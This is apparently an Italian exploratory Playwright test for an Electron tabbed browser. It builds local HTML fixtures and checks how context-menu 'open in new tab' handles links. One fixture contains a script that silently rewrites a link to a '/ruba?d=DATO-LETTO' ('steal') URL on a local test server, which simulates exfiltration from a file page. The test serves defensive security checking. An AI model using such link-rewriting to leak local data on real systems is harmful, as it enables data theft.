// #1905 giro 5: esplorazione 3.
import { test, expect } from '../../fixtures/electron.mjs';
import { writeFileSync, mkdirSync } from 'node:fs';
import { createServer } from 'node:http';
import { join } from 'node:path';
import { cartellaTemporanea } from '../../helpers/percorsi.mjs';
import { home } from '../../helpers/chatFinta.mjs';
import { paginaDellaScheda } from '../../helpers/schede.mjs';
import { menuDi } from '../../helpers/menuContestuale.mjs';

const execAction = (app, action, opts) => app.evaluate((_e, { action, opts }) => globalThis.SN_EXECUTE_FILO_ACTION(action, opts), { action, opts });
const schede = (app) => app.evaluate(({ BrowserWindow }) => BrowserWindow.getAllWindows().find((w) => w._filoTabs)._filoTabs.tabs
  .map((t) => { let u = ''; try { u = t.view.webContents.getURL(); } catch (_) {} return { id: t.id, url: t.url, vero: u }; }));
const schedaFile = async (app, fine) => (await schede(app)).find((t) => /^file:/.test(t.vero || t.url) && (t.vero || t.url).endsWith(fine))?.id || null;
const log = (k, v) => console.log(`### ${k}: ${JSON.stringify(v)}`);

test('esplora 3', async ({ app, avvisi }) => {
  test.setTimeout(180_000);
  const arrivi = [];
  const server = createServer((req, res) => { arrivi.push(`${req.method} ${req.url}`); res.writeHead(200, { 'content-type': 'text/html' }); res.end('<title>ok</title>ok'); });
  await new Promise((r) => server.listen(0, '127.0.0.1', r));
  const origine = `http://127.0.0.1:${server.address().port}`;
  const dir = join(cartellaTemporanea('g5c-'), 'Documenti', 'report');
  mkdirSync(dir, { recursive: true });
  writeFileSync(join(dir, 'capitolo.html'), '<!doctype html><title>Capitolo</title><p>uno</p>');
  writeFileSync(join(dir, 'indice.html'), `<!doctype html><title>Indice</title><body style="font:16px sans-serif">
    <p><a id="cap" href="capitolo.html">capitolo</a></p>
    <p><a id="web" href="${origine}/sito">sito</a></p>
    <script>document.getElementById('web').href = '${origine}/ruba?d=DATO-LETTO';</script></body>`);
  await home(app);
  const indice = join(dir, 'indice.html');
  await execAction(app, { type: 'NAVIGA', url: indice }, { parole: `aprimi ${indice}` });
  let id = null;
  await expect.poll(async () => (id = await schedaFile(app, 'indice.html')), { timeout: 10_000 }).toBeTruthy();
  await app.evaluate(({ BrowserWindow }, i) => BrowserWindow.getAllWindows().find((w) => w._filoTabs)._filoTabs.activate(i), id);
  let p = null;
  await expect.poll(async () => Boolean(p = await paginaDellaScheda(app, id, (x) => x.url().startsWith('file:'))), { timeout: 10_000 }).toBe(true);
  const v = { locator: () => ({ allInnerTexts: async () => { const w = app.windows().find((x) => x.url().startsWith('filo://shell/avvisi.html')); return w ? w.locator('.shell-notif.show').allInnerTexts() : null; } }) };
  void avvisi;

  log('pagina', p.url());
  const box = await p.locator('#web').boundingBox();
  log('box', box);
  const corsa = (pr, ms) => Promise.race([pr.then(() => 'ok', (e) => String(e).slice(0, 200)), new Promise((r) => setTimeout(() => r('APPESO'), ms))]);
  log('ping main prima', await corsa(app.evaluate(() => 1), 5000));
  log('ping pagina prima', await corsa(p.evaluate(() => 1), 5000));
  for (let i = 0; i < 12 && process.env.G5_SENZA_MOVE; i++) log(`ping ${i}`, await corsa(app.evaluate(() => new Promise((r) => setTimeout(() => r(1), 500))), 3000));
  if (!process.env.G5_SENZA_MOVE) log('move', await corsa(p.mouse.move(box.x + 5, box.y + 5), 10000));
  log('ping main dopo', await corsa(app.evaluate(() => 1), 5000));
  log('ping pagina dopo', await corsa(p.evaluate(() => 1), 5000));
  log('attesa', Date.now());
  await p.waitForTimeout(3000);
  log('attesa fine', Date.now());
  log('schede dopo sosta', await schede(app));
  log('crash?', await app.evaluate(({ BrowserWindow }, i) => {
    const t = BrowserWindow.getAllWindows().find((w) => w._filoTabs)._filoTabs.tabs.find((x) => x.id === i);
    return t ? { crashed: t.view.webContents.isCrashed(), destroyed: t.view.webContents.isDestroyed(), url: t.view.webContents.getURL(), id: t.view.webContents.id } : 'scheda sparita';
  }, id));
  p = await paginaDellaScheda(app, id, (x) => x.url().startsWith('file:'));
  log('pagina nuova', p ? await p.evaluate(() => [document.title, document.body.innerText.slice(0, 100)]) : null);
  log('dopo sosta', arrivi);
  await p.locator('#web').click({ button: 'right', noWaitAfter: true });
  await expect(menuDi(p).locator('.sn-menu')).toBeVisible({ timeout: 8000 });
  await new Promise((r) => setTimeout(r, 5000));
  log('menu sito', await menuDi(p).locator('.sn-menu').innerText());
  log('arrivi dopo menu', arrivi);
  await menuDi(p).locator('.sn-menu').getByText('Apri in nuova tab').first().click({ noWaitAfter: true });
  await new Promise((r) => setTimeout(r, 3000));
  log('apri in nuova tab sito', { schede: await schede(app), arrivi, avvisi: v ? await v.locator('.shell-notif.show').allInnerTexts() : null });

  await app.evaluate(({ BrowserWindow }, i) => BrowserWindow.getAllWindows().find((w) => w._filoTabs)._filoTabs.activate(i), id);
  await p.locator('#cap').click({ button: 'right', noWaitAfter: true });
  await expect(menuDi(p).locator('.sn-menu')).toBeVisible({ timeout: 8000 });
  await menuDi(p).locator('.sn-menu').getByText('Apri in nuova tab').first().click({ noWaitAfter: true });
  await new Promise((r) => setTimeout(r, 3000));
  log('apri in nuova tab fratello', { schede: await schede(app), avvisi: v ? await v.locator('.shell-notif.show').allInnerTexts() : null });
  server.close();
});
